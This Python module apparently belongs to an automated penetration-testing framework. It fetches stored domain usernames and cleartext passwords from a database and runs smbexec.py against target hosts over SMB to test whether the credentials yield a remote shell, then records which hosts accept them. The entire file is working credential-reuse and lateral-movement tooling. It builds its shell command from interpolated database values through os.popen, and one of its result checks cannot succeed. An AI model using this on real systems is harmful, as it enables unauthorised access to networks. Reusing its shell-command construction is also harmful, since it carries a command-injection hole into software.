import os
import base64


def run(params):
    #    sql = """select getDomainCredsToRetry(%s)"""
    sql = """
SELECT
    (f).host_data_id,
    (f).ip_address,
    (f).domain_creds_id,
    (f).domain,
    (f).username,
    (f).cleartext_password
FROM (select getdomaincredstoretry(%s) AS f) x;
"""

    cursor = params.db.cursor()
    cursor.execute(sql, (params.footprint_id, ))
    row = cursor.fetchone()
    cursor.close()
    # TODO: delimit password, else funny characters might cause the command to
    # fail

    if row is not None:
        cursor = params.db.cursor()
        cursor.execute("select addTaskListItem(%s, 16, %s, true, false)",
                       (params.footprint_id, row[2], ))
        task_id = cursor.fetchone()[0]
        cursor.close()

        host_id = row[0]
        ip_address = row[1]
        domain_creds_id = row[2]
        domain = row[3]
        username = row[4]
        cleartext_password = row[5]

        delimited_pwd = ""
        for c in cleartext_password:
            delimited_pwd = delimited_pwd + "\{}".format(c)

        output_file_name = "temp/" + params.getRandomFileName()
        # cmd = "timeout -s 2 3 smbexec.py {0}/{1}:{2}@{3} 445/SMB > {4}".format(domain, username, delimited_pwd, ip_address, output_file_name)
        cmd = "echo exit | timeout 10 smbexec.py {0}/{1}:{2}@{3} 445/SMB > {4}".format(
            domain, username, delimited_pwd, ip_address, output_file_name)
        params.log(cmd.split(">")[0])
        params.log("")
        os.popen(cmd)
        params.log(os.popen("cat {0}".format(output_file_name)).read())
        res = os.popen(
            "cat {0} | grep semi-interactive | wc -l".format(output_file_name)).read()[:-1]

        if res.find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
            cursorb = params.db.cursor()
            cursorb.execute("select addToDomainCredentialsMap(%s, %s, %s, %s)", (params.footprint_id, host_id, domain_creds_id, int(res) == 1, ))
            cursorb.close()
        # else do the job again.

        final_output = ""
        while not params.log_queue.empty():
            final_output += "{0}\r\n".format(params.log_queue.get(False))
        final_output = final_output[:-2]

        spCursor = params.db.cursor()
        spCursor.execute("select updateTaskStatus(%s, %s, %s, %s)", (task_id,  False,  True, base64.b64encode(final_output), ))
        spCursor.close()
